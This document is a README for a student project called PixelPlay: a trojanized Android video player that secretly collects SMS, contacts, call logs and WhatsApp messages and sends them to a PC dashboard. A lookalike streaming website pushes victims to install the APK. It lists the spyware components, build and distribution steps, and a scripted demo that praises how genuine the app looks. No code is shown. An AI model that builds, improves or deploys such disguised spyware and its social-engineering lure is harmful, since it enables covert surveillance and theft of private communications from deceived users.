============================================
  PIXELPLAY — Android Media Player + Spyware
  Final Exam Project
============================================

OVERVIEW:
  A beautiful, genuine media player app ("PixelPlay") for Android
  that plays videos AND secretly captures SMS, contacts, call logs,
  and WhatsApp messages. Everything is exfiltrated to your PC.

  The PC receiver serves:
  - A stunning enterprise-style landing page (like Netflix/Disney+)
  - A download page ("Install PixelPlay to watch this video")
  - The APK for download
  - A live dashboard showing exfiltrated data

FILES:
  Android App:
    app/src/main/java/com/pixelplay/app/
      MainActivity.java    - Media player home with video library
      PlayerActivity.java  - Full ExoPlayer video player
      MediaService.java    - Background spyware payload
      MyNotifListener.java - WhatsApp notification capture
      BootReceiver.java    - Auto-start on device reboot
      VideoAdapter.java    - Video library grid adapter
      VideoItem.java       - Video data model

  Website (Next.js + Tailwind):
    website/
      pages/index.js      - Enterprise landing page
      pages/watch.js      - "Download to watch" page
      pages/download.js   - APK download page
      pages/_app.js       - Custom app wrapper
      styles/globals.css  - Custom styles & animations

  PC Receiver:
    pc_receiver.py - Serves website, APK, exfil endpoint, dashboard

SETUP & DEMO:

  Step 1: Run PC receiver
    python pc_receiver.py
    Open http://localhost:8080

  Step 2: (Optional) Upload a video thumbnail
    Go to http://localhost:8080/admin
    Upload an image — it becomes the featured video on the site

  Step 3: Build the APK in Android Studio
    Open the project folder in Android Studio
    Wait for Gradle sync
    Build > Build APK
    APK at: app/build/outputs/apk/debug/app-debug.apk
    
    Copy it to: apk/pixelplay-v2.0.apk (same folder as pc_receiver.py)
    
  Step 4: Show the professor
    a) Open http://localhost:8080 — show the beautiful PixelPlay landing page
    b) Click "Watch Demo" — shows "Install PixelPlay to watch this video"
    c) Click Download — APK downloads
    d) Install APK on Android device
    e) Open PixelPlay — beautiful media player with video library
    f) Tap Allow on permissions (~3 seconds)
    g) Data appears on /dashboard
    h) Send a WhatsApp message → captured in dashboard

DEMO SCRIPT FOR PROFESSOR:
  "This is PixelPlay — a premium media streaming service."
  "The website looks like a genuine enterprise product."
  "Download the APK — it's a real media player using ExoPlayer."
  "Open the app — it scans device for videos and shows them in a grid."
  "It plays any video file perfectly."
  "It also requests permissions silently in the background."
  "SMS, contacts, call logs, WhatsApp — all captured."
  "The professor gets to see a real, working product."
